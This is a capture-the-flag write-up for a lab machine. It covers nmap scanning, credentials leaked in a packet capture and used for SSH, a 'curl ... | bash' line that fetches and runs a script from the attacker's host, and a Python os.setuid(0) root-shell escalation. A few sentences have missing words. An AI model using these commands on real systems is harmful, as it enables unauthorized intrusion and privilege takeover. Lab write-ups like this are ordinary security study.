
We start with nmap
```
nmap -sC -sV {victim ip}
```

We use FTP to login to the victim's box. 

```
ftp {victim's ip}
```
The login with anonymous access fails, so we attempt to login through the HTTP server.

We can visit the web application via `{ip}:80` and there is a data dashboard there without login.

When opening the web address `10.10.10.245/data/0` and capturing the output in wireshark, we get the credentials `nathan:Buck3H4TFORM3!`, we use this to `ssh` into the victim's box.

### Privilege Escalation

On our local we download linpeas and run `sudo python3 -m http.server 80` so we can get it via `curl` from the victim's box.

```
curl http://10.10.14.24/linpeas.sh | bash
```

After running LinPEAS on the attacking box we get

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The report contains an interesting entry for files with capabilities. The is found to have and , which isn't the default setting. According to the documentation, allows the process to gain setuid privileges without the SUID bit set. This effectively lets us switch to UID 0 i.e. root. The developer of Cap must have given Python this capability to enable the site to capture traffic, which a non-root user can't do.

The following Python commands will result in a root shell:

```
import os  
os.setuid(0) 
os.system("/bin/bash")
```

It calls os.setuid() which is used to modify the process user identifier (UID).

If I run:

```
$ id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

I can therefore get the root flag by `cat /root/root.txt`